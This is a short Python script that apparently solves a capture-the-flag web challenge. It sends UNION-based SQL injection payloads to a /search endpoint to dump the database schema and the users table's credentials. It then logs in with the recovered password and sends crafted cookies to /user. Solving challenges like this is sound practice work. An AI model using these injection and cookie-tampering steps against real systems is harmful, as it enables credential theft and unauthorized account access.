import requests

url = "http://chall.0xfun.org:32837/"
s = requests.Session()

# payload = "akshdaiohdosaih' union select sql, 1 from sqlite_master--"
payload = "akshdaiohdosaih' union select username, password from users--"

res = s.get(f'{url}/search', params={
    'item': payload
})

print(res.text)

# jerry: 1qaz2wsx

res = s.post(f"{url}/login", data={
    'username': 'Jerry',
    'password': '1qaz2wsx'
})

res = requests.get(f'{url}/user', cookies={
    'userID': '1',
    'user': '0cea94be4ad3fc313cee0f65c3fd5dbc5dcf93d7e1bb337f2ecac06e52f29c28'
})
print(res.text)